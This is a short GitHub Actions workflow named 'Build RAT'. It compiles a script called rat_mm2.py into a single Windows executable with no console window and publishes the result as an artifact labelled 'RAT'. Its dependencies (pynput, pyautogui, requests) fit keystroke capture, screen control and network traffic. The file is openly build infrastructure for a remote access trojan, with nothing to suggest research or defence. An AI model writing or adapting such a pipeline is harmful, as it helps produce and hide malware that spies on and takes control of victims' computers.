name: Build RAT

on:
  push:
    paths:
      - 'rat_mm2.py'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          pip install pyinstaller pyautogui pynput requests

      - name: Build EXE
        run: pyinstaller --onefile --noconsole rat_mm2.py

      - name: Upload EXE
        uses: actions/upload-artifact@v4
        with:
          name: RAT
          path: dist/rat_mm2.exe
